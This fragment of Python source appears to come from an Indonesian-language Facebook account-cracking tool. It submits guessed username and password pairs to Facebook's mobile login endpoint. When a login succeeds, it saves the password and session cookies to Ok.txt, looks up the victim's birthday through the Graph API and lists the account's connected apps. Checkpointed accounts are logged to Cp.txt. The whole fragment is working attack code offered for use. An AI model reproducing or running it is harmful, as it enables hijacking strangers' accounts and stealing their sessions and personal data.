				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						coki =";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						nunu = open('token.x', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={nunu}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s • %s • %s %s %s • %s'%(H,user,pw,day,month,year,coki))
						cek_apk(coki)
						ok.append("%s • %s • %s %s %s • %s "%(user,pw,day,month,year,kukis))
						open('Ok.txt', 'a').write(" --> %s ◊ %s ◊ %s %s %s ◊ %s \n"%(user,pw,day,month,year,coki))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print('\r %s--> %s • %s • %s'%(H,user,pw,coki))
					cek_apk(coki)
					ok.append('%s • %s • %s'%(user,pw,coki))
					open('Ok.txt', 'a').write(' --> %s ◊ %s ◊ %s\n'%(user,pw,coki))
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						nunu = open('token.x', 'r').read()
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={nunu}").json()['birthday']
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print('\r %s--> %s • %s • %s %s %s'%(K,user,pw,day,month,year))
						cp.append("%s • %s • %s %s %s"%(user,pw,day,month,year))
						open('Cp.txt', 'a').write(" --> %s • %s • %s %s %s\n"%(user,pw,day,month,year))
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print('\r %s--> %s • %s'%(K,user,pw))
					cp.append('%s • %s'%(user,pw))
					open('Cp.txt', 'a').write(" --> %s • %s\n"%(user,pw))
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			time.sleep(31)
			loop += 1
			self.mbasic(user,pwx)

def cek_apk(coki):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(N,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r      %s! cookie invalid"%(N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+coki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r      %s%s %s%s"%(K,i+1,N,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r      %s• cookie invalid"%(M))


if __name__ == '__main__':
   os.system('git pull')
   menu().main()
   folder()
